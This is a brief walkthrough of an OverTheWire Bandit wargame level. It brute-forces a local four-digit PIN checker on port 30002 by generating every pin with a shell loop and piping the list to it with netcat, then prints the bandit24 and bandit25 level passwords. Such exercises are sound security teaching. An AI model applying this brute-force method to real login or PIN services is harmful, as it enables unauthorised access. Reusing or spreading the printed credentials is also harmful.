We need to bruteforce a 4-digit pin, feeding it to port 30002. One of the pins
will give us the password to bandit25. All others will fail.

First, let's see what the port has to say.

bandit24@bandit:~$ nc localhost 30002         
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Alright. Let's do this. Let's generate a file full of entries to feed the port.

bandit24@bandit:~$ for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> /tmp/gu5ok4Do; done

Now let's feed it to the port.

bandit24@bandit:~$ nc localhost 30002 < /tmp/gu5ok4Do
-snip-
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
